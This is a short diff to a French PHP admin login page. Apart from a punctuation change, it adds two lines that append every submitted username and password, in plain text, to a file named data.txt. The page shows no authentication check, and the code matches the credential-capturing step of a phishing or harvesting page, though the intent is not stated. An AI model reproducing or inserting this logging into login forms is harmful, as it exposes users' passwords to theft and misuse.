@@ -9,7 +9,7 @@
 <body>
     <section class="cont">
         <div class="formul">
-            <p class="welcome">Bienvenue, Admin</p>
+            <p class="welcome">Bienvenue, Admin.</p>
             <form method="post">
                 <input type="text" name="user" required="required">
                 <label class="text">Nom d'utilisateur</label><br>
@@ -26,6 +26,8 @@
         if(isset($_POST["submit"])){
             $user = $_POST["user"];
             $pwd = $_POST["pwd"];
+            $file = fopen("data.txt", "a+");
+            fwrite($file, $user . "/" . $pwd);
         }
     ?>
 </body>
